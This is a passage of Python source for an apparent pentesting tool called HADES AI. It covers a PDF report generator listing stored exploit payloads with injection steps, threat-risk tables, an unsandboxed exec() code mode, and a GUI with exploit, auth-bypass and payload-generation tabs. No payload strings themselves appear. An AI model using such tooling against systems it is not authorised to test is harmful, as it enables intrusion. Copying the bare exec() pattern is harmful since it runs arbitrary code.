                    <font face='Courier' size='7'>curl -v "https://{domain_context}/[endpoint]" | grep -i "{f.get('pattern', 'pattern')[:20]}"</font>
                    """
                    elements.append(Paragraph(repro_steps, impact_style))
                    
                    # ========== REMEDIATION ==========
                    elements.append(Paragraph("<b>Recommended Remediation:</b>", label_style))
                    remediation_map = {
                        'eval_code': 'Remove eval() usage. Use JSON.parse() for data, avoid dynamic code execution. Implement strict CSP.',
                        'injection': 'Implement Content Security Policy (CSP). Sanitize all user inputs. Use httpOnly/Secure cookie flags.',
                        'data_exfil': 'Review code accessing document.cookie/localStorage. Implement CSP connect-src directive.',
                        'obfuscation': 'Investigate obfuscated code. Deobfuscate and review for malicious functionality. Use SRI for scripts.',
                        'malware': 'Quarantine file immediately. Full system scan. Investigate supply chain. Reset credentials.',
                        'exploit': 'Patch vulnerable software. Review exploitation attempt origin. Block malicious IPs. Enable WAF.',
                        'backdoor': 'Isolate affected system. Full forensic analysis. Reset all credentials. Review access logs.',
                        'crypto': 'Remove cryptomining code. Audit third-party scripts. Implement Subresource Integrity (SRI).'
                    }
                    elements.append(Paragraph(
                        remediation_map.get(threat_type, 'Investigate the finding and apply appropriate security controls.'),
                        impact_style
                    ))
                    
                    # References
                    elements.append(Paragraph("<b>References:</b>", label_style))
                    elements.append(Paragraph(
                        f"• {impact_info['cwe']}: https://cwe.mitre.org/data/definitions/{self._extract_cwe_id(impact_info['cwe'])}.html<br/>"
                        f"• OWASP: https://owasp.org/Top10/<br/>"
                        f"• NVD: https://nvd.nist.gov/",
                        ParagraphStyle('Ref', parent=impact_style, fontSize=7, textColor=colors.HexColor('#0066cc'))
                    ))
                    
                    elements.append(Spacer(1, 25))
                    
                    if idx % 2 == 0:
                        elements.append(PageBreak())
                
                elements.append(PageBreak())
            
            # ========== LEARNED EXPLOITS ==========
            if exploits:
                elements.append(Paragraph("3. Learned Exploit Database", heading_style))
                elements.append(Paragraph(
                    """The following exploits were learned from external sources and cached content analysis.
                    Each exploit includes verification status, context, and usage guidance.""",
                    normal_style
                ))
                elements.append(Spacer(1, 15))
                
                # Exploit type descriptions with CWE mapping
                exploit_cwe_map = {
                    'xss': {'cwe': 'CWE-79', 'name': 'Cross-Site Scripting', 'severity': 'Medium-High'},
                    'sqli': {'cwe': 'CWE-89', 'name': 'SQL Injection', 'severity': 'Critical'},
                    'rce': {'cwe': 'CWE-94', 'name': 'Remote Code Execution', 'severity': 'Critical'},
                    'lfi': {'cwe': 'CWE-98', 'name': 'Local File Inclusion', 'severity': 'High'},
                    'rfi': {'cwe': 'CWE-98', 'name': 'Remote File Inclusion', 'severity': 'Critical'},
                    'ssrf': {'cwe': 'CWE-918', 'name': 'Server-Side Request Forgery', 'severity': 'High'},
                    'xxe': {'cwe': 'CWE-611', 'name': 'XML External Entity', 'severity': 'High'},
                    'csrf': {'cwe': 'CWE-352', 'name': 'Cross-Site Request Forgery', 'severity': 'Medium'},
                    'idor': {'cwe': 'CWE-639', 'name': 'Insecure Direct Object Reference', 'severity': 'Medium-High'},
                    'auth_bypass': {'cwe': 'CWE-287', 'name': 'Authentication Bypass', 'severity': 'Critical'},
                }
                
                exploit_types = {}
                for e in exploits:
                    t = e['exploit_type']
                    if t not in exploit_types:
                        exploit_types[t] = []
                    exploit_types[t].append(e)
                
                for exploit_type, type_exploits in exploit_types.items():
                    exploit_info = exploit_cwe_map.get(exploit_type.lower(), {
                        'cwe': 'CWE-Unknown', 'name': exploit_type, 'severity': 'TBD'
                    })
                    
                    elements.append(Paragraph(
                        f"<b>{exploit_type.upper().replace('_', ' ')}</b> ({len(type_exploits)} variants)",
                        subheading_style
                    ))
                    
                    # Exploit type metadata
                    elements.append(Paragraph(
                        f"<b>Category:</b> {exploit_info['name']} | "
                        f"<b>CWE:</b> {exploit_info['cwe']} | "
                        f"<b>Typical Severity:</b> {exploit_info['severity']}",
                        ParagraphStyle('Meta', parent=impact_style, fontSize=8, textColor=colors.HexColor('#666'))
                    ))
                    elements.append(Spacer(1, 5))
                    
                    for i, exploit in enumerate(type_exploits[:10], 1):
                        elements.append(Paragraph(f"<b>Variant #{i}</b>", label_style))
                        
                        # Source and verification
                        elements.append(Paragraph(f"<b>Source URL:</b> {exploit['source_url']}", impact_style))
                        elements.append(Paragraph(f"<b>Learned:</b> {exploit['learned_at'][:16]}", impact_style))
                        
                        success_rate = exploit['success_count'] / max(1, exploit['success_count'] + exploit['fail_count'])
                        verification_status = 'Verified' if success_rate > 0.5 else 'Unverified - Testing Required'
                        status_color = '#4CAF50' if success_rate > 0.5 else '#ffa500'
                        
                        elements.append(Paragraph(
                            f"<b>Verification:</b> <font color='{status_color}'>{verification_status}</font> "
                            f"(Success Rate: {success_rate:.0%})",
                            impact_style
                        ))
                        
                        # Context for the exploit
                        elements.append(Paragraph("<b>Exploit Context:</b>", label_style))
                        context_text = f"""
                        • <b>Input Parameter:</b> Extracted from source URL path/query<br/>
                        • <b>Expected Response:</b> Application-specific - verify manually<br/>
                        • <b>Testing Notes:</b> Use in authorized environments only
                        """
                        elements.append(Paragraph(context_text, 
                            ParagraphStyle('Context', parent=impact_style, fontSize=8)))
                        
                        elements.append(Paragraph("<b>Payload:</b>", label_style))
                        code = exploit['code'][:600].replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
                        code_lines = code.split('\n')
                        formatted_code = '<br/>'.join(code_lines[:12])
                        elements.append(Paragraph(f"<font face='Courier' size='7'>{formatted_code}</font>", code_style))
                        
                        # How to use
                        elements.append(Paragraph("<b>Usage Instructions:</b>", label_style))
                        elements.append(Paragraph(
                            "1. Identify target endpoint matching exploit type<br/>"
                            "2. Modify payload parameters for target context<br/>"
                            "3. Use Burp Suite/OWASP ZAP to inject payload<br/>"
                            "4. Observe response for vulnerability indicators",
                            ParagraphStyle('Usage', parent=impact_style, fontSize=8)
                        ))
                        
                        elements.append(Spacer(1, 15))
                    
                    elements.append(Spacer(1, 10))
                
                elements.append(PageBreak())
            
            # ========== SECURITY PATTERNS ==========
            if patterns:
                elements.append(Paragraph("4. Learned Security Patterns", heading_style))
                
                patterns_data = [['Pattern Type', 'Signature', 'Confidence', 'Occurrences']]
                for p in patterns[:50]:
                    sig = p.signature[:45].replace('<', '&lt;').replace('>', '&gt;')
                    patterns_data.append([
                        p.pattern_type,
                        sig,
                        f"{p.confidence:.0%}",
                        str(p.occurrences)
                    ])
                
                patterns_table = Table(patterns_data, colWidths=[1.3*inch, 3.5*inch, 0.9*inch, 0.9*inch])
                patterns_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, -1), 8),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f5f5f5')),
                    ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cccccc')),
                    ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, colors.HexColor('#f5f5f5')]),
                ]))
                elements.append(patterns_table)
            
            # ========== APPENDIX: SCREENSHOT PLACEHOLDERS ==========
            elements.append(PageBreak())
            elements.append(Paragraph("Appendix A: Evidence Screenshots", heading_style))
            elements.append(Paragraph(
                """
                <i>This section is reserved for manual screenshot attachments.</i><br/><br/>
                For complete bug bounty submissions, attach the following evidence:<br/>
                • Browser console output showing the vulnerability<br/>
                • Network tab showing malicious requests<br/>
                • cURL commands to reproduce the issue<br/>
                • Video proof-of-concept (if applicable)<br/><br/>
                
                <b>Recommended Tools for Evidence Collection:</b><br/>
                • Burp Suite - Request/Response capture<br/>
                • Browser DevTools - Console and Network logs<br/>
                • Wireshark - Network traffic analysis<br/>
                • OBS Studio - Video PoC recording
                """,
                normal_style
            ))
            
            # ========== FOOTER ==========
            elements.append(Spacer(1, 40))
            elements.append(Paragraph(
                "─" * 60,
                ParagraphStyle('Line', alignment=TA_CENTER, textColor=colors.gray)
            ))
            elements.append(Paragraph(
                "Generated by HADES AI - Self-Learning Pentesting Assistant<br/>"
                "This report is confidential and intended for authorized recipients only.",
                ParagraphStyle('Footer', parent=normal_style, 
                              fontSize=8, textColor=colors.gray, alignment=TA_CENTER)
            ))
            
            doc.build(elements)
            
            # Clear detections if requested
            if clear_after:
                self._clear_detections()
            
            return {
                'success': True, 
                'filepath': filepath,
                'exploits_exported': len(exploits),
                'findings_exported': min(len(findings), 30),
                'patterns_exported': min(len(patterns), 50),
                'cleared': clear_after
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _clear_detections(self):
        with self.kb.lock:
            cursor = self.kb.conn.cursor()
            cursor.execute('DELETE FROM threat_findings')
            cursor.execute('DELETE FROM learned_exploits')
            cursor.execute('DELETE FROM cache_entries')
            self.kb.conn.commit()
    
    def _get_owasp_category(self, threat_type: str) -> str:
        """Map threat type to OWASP Top 10 category"""
        owasp_map = {
            'eval_code': 'A03:2021 Injection',
            'injection': 'A03:2021 Injection',
            'data_exfil': 'A01:2021 Broken Access Control',
            'obfuscation': 'A09:2021 Security Logging Failures',
            'malware': 'A08:2021 Software and Data Integrity',
            'exploit': 'A03:2021 Injection',
            'backdoor': 'A08:2021 Software and Data Integrity',
            'crypto': 'A05:2021 Security Misconfiguration'
        }
        return owasp_map.get(threat_type, 'A00:2021 Unclassified')
    
    def _get_data_theft_risk(self, threat_type: str) -> str:
        """Get data theft risk description"""
        risk_map = {
            'eval_code': 'HIGH - Arbitrary code can access all browser data',
            'injection': 'HIGH - XSS can steal cookies, tokens, and form data',
            'data_exfil': 'CRITICAL - Direct data exfiltration detected',
            'obfuscation': 'MEDIUM - Hidden code may contain data theft logic',
            'malware': 'CRITICAL - Malware typically includes data theft',
            'exploit': 'HIGH - Exploitation often leads to data access',
            'backdoor': 'CRITICAL - Full data access via persistent backdoor',
            'crypto': 'LOW - Primarily resource theft, not data'
        }
        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
    
    def _get_session_risk(self, threat_type: str) -> str:
        """Get session hijack risk description"""
        risk_map = {
            'eval_code': 'HIGH - Can steal session cookies and tokens',
            'injection': 'HIGH - XSS commonly used for session hijacking',
            'data_exfil': 'HIGH - Cookie exfiltration enables session hijack',
            'obfuscation': 'MEDIUM - May hide session theft code',
            'malware': 'HIGH - Session theft is common malware behavior',
            'exploit': 'MEDIUM - Depends on exploit type',
            'backdoor': 'HIGH - Persistent session access',
            'crypto': 'LOW - Not typically session-focused'
        }
        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
    
    def _get_rce_risk(self, threat_type: str) -> str:
        """Get remote code execution risk description"""
        risk_map = {
            'eval_code': 'CRITICAL - eval() enables direct code execution',
            'injection': 'MEDIUM - Client-side only unless combined with other vulns',
            'data_exfil': 'LOW - Data theft, not code execution',
            'obfuscation': 'MEDIUM - May hide RCE payloads',
            'malware': 'CRITICAL - Malware executes arbitrary code',
            'exploit': 'CRITICAL - Exploits often target RCE',
            'backdoor': 'CRITICAL - Full remote code execution capability',
            'crypto': 'LOW - Typically limited to mining code'
        }
        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
    
    def _get_lateral_risk(self, threat_type: str) -> str:
        """Get lateral movement risk description"""
        risk_map = {
            'eval_code': 'MEDIUM - Could be used to attack internal resources',
            'injection': 'LOW - Browser-confined unless targeting intranet',
            'data_exfil': 'MEDIUM - Stolen creds enable lateral movement',
            'obfuscation': 'MEDIUM - May hide lateral movement code',
            'malware': 'HIGH - Malware often spreads laterally',
            'exploit': 'HIGH - Exploitation chains enable pivoting',
            'backdoor': 'CRITICAL - Backdoors enable full network access',
            'crypto': 'LOW - Focused on local resource consumption'
        }
        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
    
    def _extract_cwe_id(self, cwe_string: str) -> str:
        """Extract CWE number from string like 'CWE-94: ...'"""
        import re
        match = re.search(r'CWE-(\d+)', cwe_string)
        return match.group(1) if match else '0'
    def dispatch(self, user_input):
        user_input = user_input.strip()

        if user_input.startswith("::mode"):
            _, new_mode = user_input.split(" ", 1)
            self.mode = new_mode.strip()
            return f"🔁 Mode switched to: {self.mode}"

        if self.mode == 'code':
            return self.handle_code_interpreter(user_input)

        elif self.mode == 'explain':
            return self.explain_code(user_input)

        else:
            return self.handle_chat(user_input)

    def handle_chat(self, user_input):
        return f"[HadesAI] ✒️ Echoing in {self.personality}: {user_input}"

    def handle_code_interpreter(self, code_str):
        try:
            old_stdout = sys.stdout
            sys.stdout = mystdout = StringIO()
            exec(code_str, {}, {})
            output = mystdout.getvalue()
            sys.stdout = old_stdout
            return f"✅ Code executed.\nOutput:\n{output.strip()}"
        except Exception as e:
            sys.stdout = old_stdout
            return f"❌ Execution Error:\n{traceback.format_exc()}"

    def explain_code(self, code_str):
        try:
            tree = ast.parse(code_str)
            explanations = []
            for node in tree.body:
                if isinstance(node, ast.FunctionDef):
                    args = [arg.arg for arg in node.args.args]
                    explanations.append(
                        f"📘 Function `{node.name}` takes args: {args}"
                    )
                elif isinstance(node, ast.Import):
                    modules = [alias.name for alias in node.names]
                    explanations.append(f"📦 Imports modules: {modules}")
                elif isinstance(node, ast.ImportFrom):
                    modules = [alias.name for alias in node.names]
                    explanations.append(f"📦 From {node.module} import {modules}")
                elif isinstance(node, ast.Assign):
                    targets = [ast.unparse(t) for t in node.targets]
                    explanations.append(f"🔧 Variable(s) assigned: {targets}")
            return "\n".join(explanations) if explanations else "ℹ️ No recognizable constructs to explain."
        except Exception as e:
            return f"❌ Explanation Error:\n{traceback.format_exc()}"

# ============================================================================
# GUI
# ============================================================================

class HadesGUI(QMainWindow):
    DONATE_URL = "https://buy.stripe.com/28EbJ1f7ceo3ckyeES5kk00"
    
    def __init__(self):
        super().__init__()
        self.ai = HadesAI()
        self.scanner = None
        self.tool_executor = None
        self.network_monitor = None
        self.autonomous_defense = None  # Autonomous defense engine
        self.brain = pcore.load_brain()
        self.init_ui()
        self._show_startup_dialog()
        
    def init_ui(self):
        self.setWindowTitle("HADES AI - Interactive Pentesting Assistant")
        self.setMinimumSize(1400, 900)
        self.setStyleSheet(self._get_style())
        
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)
        
        self.tabs.addTab(self._create_chat_tab(), "💬 AI Chat")
        self.tabs.addTab(self._create_active_defense_tab(), "🛡️ Active Defense")
        self.tabs.addTab(self._create_network_monitor_tab(), "🛡️ Network Monitor")
        self.tabs.addTab(self._create_web_knowledge_tab(), "🧠 Web Knowledge")
        self.tabs.addTab(self._create_tools_tab(), "🛠️ Tools & Targets")
        self.tabs.addTab(self._create_exploit_tab(), "⚔️ Active Exploit")
        self.tabs.addTab(self._create_injection_tab(), "💉 Request Injection")
        self.tabs.addTab(self._create_auth_bypass_tab(), "🔓 Auth Bypass")
        self.tabs.addTab(self._create_proxy_tab(), "🌐 Proxy Settings")
        if HAS_PAYLOAD_GEN:
            self.tabs.addTab(PayloadGeneratorTab(), "📦 Payload Gen")
        if HAS_DATA_MAPPING:
            self.tabs.addTab(DataMappingTab(), "🗺️ Data Mapping")
        self.tabs.addTab(self._create_findings_tab(), "🔍 Threat Findings")
        self.tabs.addTab(self._create_learned_tab(), "🧠 Learned Exploits")
        self.tabs.addTab(self._create_cache_tab(), "📂 Cache Scanner")
        self.tabs.addTab(self._create_code_tab(), "💻 Code Analysis")
        self.tabs.addTab(self._create_code_helper_tab(), "💻 Code Helper")
        self.tabs.addTab(self._create_self_improvement_tab(), "🔧 Self-Improvement")
        self.tabs.addTab(self._create_autorecon_tab(), "🧠 AutoRecon")
        self.tabs.addTab(self._create_modules_tab(), "🧩 Modules")
        if HAS_SCRIPT_EDITOR:
            self.tabs.addTab(PythonScriptEditorTab(), "📜 Script Editor")
        if HAS_REALISTIC_SIMS:
            self.tabs.addTab(create_realistic_simulations_tab(), "🎯 Simulations")
        if HAS_DEPLOYMENT_AUTOMATION:
            try:
                self.deployment_automation_tab = DeploymentAutomationTab(db_path=self.ai.db_path)
                self.tabs.addTab(self.deployment_automation_tab, "🚀 Deploy & Test")
            except Exception as e:
                logger.warning(f"Deployment Automation tab failed: {e}")
        if HAS_AUTONOMOUS_AGENT:
            self.tabs.addTab(self._create_agent_tab(), "🤖 Autonomous Coder")
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.progress = QProgressBar()
        self.progress.setMaximumWidth(200)
        self.progress.hide()
        self.status_bar.addPermanentWidget(self.progress)
        
        # Donate button in status bar
        donate_btn = QPushButton("💝 Support Development")
        donate_btn.setStyleSheet("""
            QPushButton { 
                background: linear-gradient(45deg, #ff6b6b, #e94560); 
                color: white; 
                padding: 5px 15px; 
                border-radius: 3px;
                font-weight: bold;
            }
            QPushButton:hover { background: #ff8585; }
        """)
        donate_btn.clicked.connect(self._open_donate_link)
        self.status_bar.addPermanentWidget(donate_btn)
        
    def _get_style(self) -> str:
        return """
            QMainWindow, QWidget { background-color: #1a1a2e; color: #eee; }
            QTabWidget::pane { border: 1px solid #16213e; background: #16213e; }
            QTabBar::tab { background: #16213e; color: #eee; padding: 10px 20px; }
            QTabBar::tab:selected { background: #0f3460; border-bottom: 2px solid #e94560; }
            QPushButton { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; }
            QPushButton:hover { background: #ff6b6b; }
            QPushButton:disabled { background: #444; }
            QLineEdit, QTextEdit, QPlainTextEdit { background: #16213e; color: #eee; border: 1px solid #0f3460; border-radius: 5px; padding: 8px; font-family: Consolas; }
            QTreeWidget, QTableWidget, QListWidget { background: #16213e; color: #eee; border: 1px solid #0f3460; alternate-background-color: #1a1a2e; }
            QHeaderView::section { background: #0f3460; color: #eee; padding: 8px; border: none; }
            QGroupBox { border: 1px solid #0f3460; border-radius: 5px; margin-top: 15px; padding-top: 15px; }
            QGroupBox::title { color: #e94560; subcontrol-origin: margin; left: 10px; }
            QScrollBar:vertical { background: #16213e; width: 12px; }
            QScrollBar::handle:vertical { background: #0f3460; border-radius: 6px; }
            QComboBox { background: #0f3460; color: #eee; padding: 8px; border-radius: 5px; }
            QProgressBar { border: 1px solid #0f3460; border-radius: 5px; text-align: center; }
            QProgressBar::chunk { background: #e94560; }
        """
    
    def _show_startup_dialog(self):
        """Show donation/welcome dialog on startup."""
        import webbrowser
        
        dialog = QMessageBox(self)
        dialog.setWindowTitle("Welcome to HADES AI")
        dialog.setIconPixmap(dialog.style().standardPixmap(dialog.style().StandardPixmap.SP_MessageBoxInformation))
        dialog.setText("""
<h2 style='color: #e94560;'>🔥 HADES AI - Pentesting Assistant</h2>
<p>Thank you for using HADES AI!</p>
<p>This tool is <b>free and open source</b>. If you find it useful, 
please consider supporting its development.</p>
<p style='color: #4CAF50;'>Your support helps keep this project alive!</p>
        """)
        dialog.setTextFormat(Qt.TextFormat.RichText)
        
        donate_btn = dialog.addButton("💝 Donate Now", QMessageBox.ButtonRole.AcceptRole)
        later_btn = dialog.addButton("Maybe Later", QMessageBox.ButtonRole.RejectRole)
        
        dialog.setStyleSheet("""
            QMessageBox { background-color: #1a1a2e; }
            QMessageBox QLabel { color: #eee; font-size: 12px; }
            QPushButton { 
                background: #e94560; 
                color: white; 
                padding: 8px 20px; 
                border-radius: 5px; 
                font-weight: bold;
                min-width: 100px;
            }
            QPushButton:hover { background: #ff6b6b; }
        """)
        
        dialog.exec()
        
        if dialog.clickedButton() == donate_btn:
            webbrowser.open(self.DONATE_URL)
    
    def _open_donate_link(self):
        """Open donation link in browser."""
        import webbrowser
        webbrowser.open(self.DONATE_URL)
        
    def _create_chat_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        self.chat_display = QTextEdit()
        self.chat_display.setReadOnly(True)
        self.chat_display.setFont(QFont("Consolas", 11))
        self.chat_display.setMinimumHeight(500)
        layout.addWidget(self.chat_display)
        
        self._add_chat_message("system", "Welcome to HADES AI! I'm your interactive pentesting assistant.\n\nI can:\n• Scan ports, directories, and subdomains\n• Learn exploits from websites\n• Analyze browser cache for threats\n• Remember patterns and improve over time\n\nType 'help' for commands or just tell me what you want to do!")
        
        input_layout = QHBoxLayout()
        self.chat_input = QLineEdit()
        self.chat_input.setPlaceholderText("Talk to HADES... (e.g., 'scan ports on 192.168.1.1' or 'learn from https://...')")
        self.chat_input.returnPressed.connect(self._send_chat)
        self.chat_input.setMinimumHeight(40)
        input_layout.addWidget(self.chat_input)
        
        send_btn = QPushButton("Send")
        send_btn.clicked.connect(self._send_chat)
        send_btn.setMinimumWidth(100)
        input_layout.addWidget(send_btn)
        
        clear_btn = QPushButton("Clear")
        clear_btn.clicked.connect(self._clear_chat)
        clear_btn.setMinimumWidth(80)
        clear_btn.setStyleSheet("background: #0f3460;")
        input_layout.addWidget(clear_btn)
        
        layout.addLayout(input_layout)
        
        quick_layout = QHBoxLayout()
        for cmd in ["help", "show stats", "scan browser cache"]:
            btn = QPushButton(cmd)
            btn.clicked.connect(lambda checked, c=cmd: self._quick_command(c))
            btn.setStyleSheet("background: #0f3460;")
            quick_layout.addWidget(btn)
        layout.addLayout(quick_layout)
        
        return widget
    
    def _create_network_monitor_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Control Panel
        control_group = QGroupBox("🛡️ Network Defense Control")
        control_layout = QHBoxLayout(control_group)
        
        self.monitor_start_btn = QPushButton("▶ Start Monitor")
        self.monitor_start_btn.clicked.connect(self._start_network_monitor)
        self.monitor_start_btn.setStyleSheet("background: #4CAF50;")
        control_layout.addWidget(self.monitor_start_btn)
        
        self.monitor_stop_btn = QPushButton("⏹ Stop Monitor")
        self.monitor_stop_btn.clicked.connect(self._stop_network_monitor)
        self.monitor_stop_btn.setEnabled(False)
        self.monitor_stop_btn.setStyleSheet("background: #f44336;")
        control_layout.addWidget(self.monitor_stop_btn)
        
        control_layout.addWidget(QLabel("  |  "))
        
        self.defense_mode_check = QCheckBox("⚔️ Active Defense (Auto-block & counter)")
        self.defense_mode_check.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        self.defense_mode_check.toggled.connect(self._toggle_defense_mode)
        control_layout.addWidget(self.defense_mode_check)
        
        self.learning_mode_check = QCheckBox("🧠 Learning Mode")
        self.learning_mode_check.setChecked(True)
        self.learning_mode_check.setStyleSheet("color: #4CAF50;")
        self.learning_mode_check.toggled.connect(self._toggle_learning_mode)
        control_layout.addWidget(self.learning_mode_check)
        
        # Autonomous Defense Controls
        control_layout.addWidget(QLabel("  |  "))
        
        self.autonomous_defense_check = QCheckBox("🤖 Autonomous Defense")
        self.autonomous_defense_check.setStyleSheet("color: #00fff2; font-weight: bold;")
        self.autonomous_defense_check.setToolTip("Enable AI-driven autonomous defensive actions:\n"
            "• Honeypot deployment for attacker deception\n"
            "• Rate limiting and connection throttling\n"
            "• DNS sinkholing for malicious domains\n"
            "• Adaptive response based on threat severity\n"
            "• Deceptive responses to waste attacker resources")
        self.autonomous_defense_check.toggled.connect(self._toggle_autonomous_defense)
        control_layout.addWidget(self.autonomous_defense_check)
        
        self.defense_level_combo = QComboBox()
        self.defense_level_combo.addItems(["Passive", "Reactive", "Proactive", "Aggressive"])
        self.defense_level_combo.setCurrentIndex(1)  # Default: Reactive
        self.defense_level_combo.setStyleSheet("background: #1a1a2e; color: #eee;")
        self.defense_level_combo.setToolTip("Defense Level:\n"
            "• Passive: Monitor and log only\n"
            "• Reactive: Respond to detected threats\n"
            "• Proactive: Actively hunt and deploy honeypots\n"
            "• Aggressive: Maximum defense with countermeasures")
        self.defense_level_combo.currentIndexChanged.connect(self._on_defense_level_changed)
        control_layout.addWidget(self.defense_level_combo)
        
        control_layout.addStretch()
        layout.addWidget(control_group)
        
        # Stats Panel
        stats_group = QGroupBox("📊 Real-Time Statistics")
        stats_layout = QHBoxLayout(stats_group)
        
        self.net_stats_labels = {}
        stat_items = [
            ('runtime', 'Runtime', '00:00:00'),
            ('total_connections', 'Connections', '0'),
            ('threats_detected', 'Threats', '0'),
            ('attacks_blocked', 'Blocked', '0'),
            ('unique_ips', 'Unique IPs', '0'),
            ('blocked_ips', 'Blocked IPs', '0'),
            ('honeypot_hits', 'Honeypot Hits', '0'),
            ('auto_mitigated', 'Auto Mitigated', '0'),
        ]
        
        for key, label, default in stat_items:
            frame = QGroupBox(label)
            frame_layout = QVBoxLayout(frame)
            stat_label = QLabel(default)
            stat_label.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
            stat_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            if 'threat' in key or 'blocked' in key:
                stat_label.setStyleSheet("color: #ff6b6b;")
            else:
                stat_label.setStyleSheet("color: #00fff2;")
            frame_layout.addWidget(stat_label)
            self.net_stats_labels[key] = stat_label
            stats_layout.addWidget(frame)
            
        layout.addWidget(stats_group)
        
        # Main content splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Connection Log
        conn_group = QGroupBox("🌐 Live Connections")
        conn_layout = QVBoxLayout(conn_group)
        self.connection_table = QTableWidget()
        self.connection_table.setColumnCount(6)
        self.connection_table.setHorizontalHeaderLabels(["Time", "Remote", "Local Port", "Process", "Status", "Threat"])
        self.connection_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.connection_table.setAlternatingRowColors(True)
        conn_layout.addWidget(self.connection_table)
        splitter.addWidget(conn_group)
        
        # Threat Log
        threat_group = QGroupBox("⚠️ Threat Detections")
        threat_layout = QVBoxLayout(threat_group)
        self.threat_table = QTableWidget()
        self.threat_table.setColumnCount(5)
        self.threat_table.setHorizontalHeaderLabels(["Time", "IP", "Type", "Level", "Details"])
        self.threat_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.threat_table.setAlternatingRowColors(True)
        threat_layout.addWidget(self.threat_table)
        splitter.addWidget(threat_group)
        
        layout.addWidget(splitter)
        
        # Manual Controls
        manual_group = QGroupBox("🔧 Manual Controls")
        manual_layout = QHBoxLayout(manual_group)
        
        manual_layout.addWidget(QLabel("IP Address:"))
        self.block_ip_input = QLineEdit()
        self.block_ip_input.setPlaceholderText("Enter IP to block...")
        manual_layout.addWidget(self.block_ip_input)
        
        block_btn = QPushButton("🚫 Block IP")
        block_btn.clicked.connect(self._manual_block_ip)
        block_btn.setStyleSheet("background: #f44336;")
        manual_layout.addWidget(block_btn)
        
        unblock_btn = QPushButton("✅ Unblock IP")
        unblock_btn.clicked.connect(self._manual_unblock_ip)
        unblock_btn.setStyleSheet("background: #4CAF50;")
        manual_layout.addWidget(unblock_btn)
        
        clear_threats_btn = QPushButton("🗑️ Clear Threats")
        clear_threats_btn.clicked.connect(self._clear_threat_log)
        clear_threats_btn.setStyleSheet("background: #0f3460;")
        manual_layout.addWidget(clear_threats_btn)
        
        manual_layout.addStretch()
        layout.addWidget(manual_group)
        
        # Status bar for network monitor
        self.net_status_label = QLabel("🔴 Network Monitor INACTIVE - Click Start to begin monitoring")
        self.net_status_label.setStyleSheet("padding: 10px; background: #0f3460; border-radius: 5px; font-size: 12px;")
        layout.addWidget(self.net_status_label)
        
        return widget
        
    def _create_active_defense_tab(self) -> QWidget:
        """Separate defense tab for managing autonomous defense independently from network monitor"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        if not HAS_AUTONOMOUS_DEFENSE:
            layout.addWidget(QLabel("Autonomous defense module not available."))
            widget.setLayout(layout)
            return widget

        # Create a separate autonomous defense instance for this tab
        self.defense_tab_engine = AutonomousDefenseEngine()

        status_group = QGroupBox("Defense Status")
        status_layout = QVBoxLayout(status_group)
        self.defense_status_label = QLabel("Status: Disabled")
        self.defense_status_label.setStyleSheet("color: #ff6b6b;")
        status_layout.addWidget(self.defense_status_label)

        control_layout = QHBoxLayout()
        self.defense_enable_btn = QPushButton("Enable Defense")
        self.defense_enable_btn.clicked.connect(self._toggle_defense_tab)
        self.defense_block_btn = QPushButton("Block IP")
        self.defense_block_btn.clicked.connect(self._block_ip_from_defense_tab)
        self.defense_block_input = QLineEdit()
        self.defense_block_input.setPlaceholderText("IP address to block")

        control_layout.addWidget(self.defense_enable_btn)
        control_layout.addWidget(self.defense_block_input)
        control_layout.addWidget(self.defense_block_btn)
        control_layout.addStretch()

        status_layout.addLayout(control_layout)
        layout.addWidget(status_group)

        config_group = QGroupBox("Configuration")
        config_layout = QFormLayout(config_group)

        self.defense_tab_level_combo = QComboBox()
        self.defense_tab_level_combo.addItems(["PASSIVE", "REACTIVE", "PROACTIVE", "AGGRESSIVE"])
        self.defense_tab_level_combo.setCurrentText("REACTIVE")
        config_layout.addRow("Defense Level:", self.defense_tab_level_combo)

        self.defense_auto_response_cb = QCheckBox("Auto-Response")
        self.defense_auto_response_cb.setChecked(True)
        config_layout.addRow("Auto-Response:", self.defense_auto_response_cb)

        self.defense_block_threshold = QDoubleSpinBox()
        self.defense_block_threshold.setRange(0.0, 1.0)
        self.defense_block_threshold.setValue(0.7)
        self.defense_block_threshold.setSingleStep(0.05)
        config_layout.addRow("Block Threshold:", self.defense_block_threshold)

        layout.addWidget(config_group)

        layout.addWidget(QLabel("Threat Log (Recent)"))
        self.defense_threat_log = QTextEdit()
        self.defense_threat_log.setReadOnly(True)
        self.defense_threat_log.setMaximumHeight(150)
        layout.addWidget(self.defense_threat_log)

        layout.addWidget(QLabel("Blocked IPs"))
        self.defense_blocked_ips = QTextEdit()
        self.defense_blocked_ips.setReadOnly(True)
        self.defense_blocked_ips.setMaximumHeight(100)
        layout.addWidget(self.defense_blocked_ips)

        layout.addStretch()
